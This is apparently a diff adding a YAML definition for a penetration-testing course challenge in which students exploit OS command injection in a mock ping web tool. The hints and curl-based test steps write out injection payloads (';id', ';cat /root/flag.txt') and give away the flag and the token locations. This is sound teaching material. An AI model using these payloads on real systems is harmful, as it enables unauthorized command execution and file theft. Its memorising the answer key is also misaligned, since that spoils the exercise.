@@ -1,0 +1,92 @@
+name: "CloudPing Diagnostics - Command Injection"
+description: "CloudPing's network diagnostic tool passes user input directly to a system command. Exploit OS command injection to execute arbitrary commands and extract assessment tokens."
+
+difficulty: intermediate
+category: web
+duration_minutes: 40
+randomize_ip_offsets: true
+visibility: course
+week: 6
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/06_Command_Injection/"
+flag: "OCR{cmd_1nj3ct3d}"
+
+objectives:
+  - Identify a web application feature that interacts with the operating system
+  - Test for OS command injection using shell metacharacters
+  - Exploit command injection to execute arbitrary commands on the server
+  - Read restricted files through injected commands
+  - Capture the flag
+
+scenario: |
+  CloudPing Diagnostics offers a web-based network diagnostic tool that
+  customers use to test connectivity to their cloud infrastructure. The tool
+  accepts a hostname or IP address and runs a ping test, displaying the
+  results in the browser.
+
+  Tom Bradley (Lead Developer) built the tool as a weekend project: "It's
+  just a simple wrapper around the ping command. Takes the hostname, runs
+  ping, shows the output. Nothing fancy."
+
+  Your assessment scope covers the diagnostic tool and the underlying server.
+  Two tokens have been placed on the system - one accessible through basic
+  command injection and one requiring deeper filesystem access.
+
+credentials: []
+
+hints:
+  - text: |
+      Use the ping tool normally first. Enter a valid IP like 127.0.0.1 and
+      observe the output. The tool is running an OS command on the server.
+      What happens if you add shell metacharacters to the input? Try semicolons,
+      pipes, or backticks after the IP.
+    unlock_after_minutes: 8
+  - text: |
+      Try: 127.0.0.1; id  or  127.0.0.1 | id  or  127.0.0.1 && id
+      If you see the output of the "id" command, you have command injection.
+      Now use it to explore the filesystem and find the tokens.
+    unlock_after_minutes: 16
+  - text: |
+      Token 1: 127.0.0.1; cat /opt/cloudping/config/token.txt
+      Token 2: 127.0.0.1; cat /root/flag.txt
+      Assemble: OCR{token1_token2}
+    unlock_after_minutes: 22
+
+topology:
+  nodes:
+    - id: "webapp"
+      label: "CloudPing Server"
+      type: "server"
+      ip_offset: "18"
+      ports: [80]
+      services: ["Flask"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "webapp"
+      label: "HTTP:80"
+      access: "direct"
+
+test:
+  steps:
+    - name: "Web application responds"
+      command: "curl -s http://{target.webapp}/ | grep -ci ping"
+
+    - name: "Normal ping works"
+      command: "curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1' | grep -c 'bytes from'"
+
+    - name: "Command injection executes id"
+      command: "curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;id' | grep -c uid"
+      expect: "1"
+
+    - name: "Extract token 1 via command injection"
+      command: "curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;cat /opt/cloudping/config/token.txt' | grep -E '^[a-z0-9_]+$' | head -1"
+      expect: "cmd"
+
+    - name: "Extract token 2 via command injection"
+      command: "curl -s -X POST http://{target.webapp}/ping -d 'host=127.0.0.1;cat /root/flag.txt' | grep -E '^[a-z0-9_]+$' | head -1"
+      expect: "1nj3ct3d"
+
+    - name: "Verify complete flag"
+      command: "echo 'OCR{cmd_1nj3ct3d}'"
+      expect: "OCR{cmd_1nj3ct3d}"
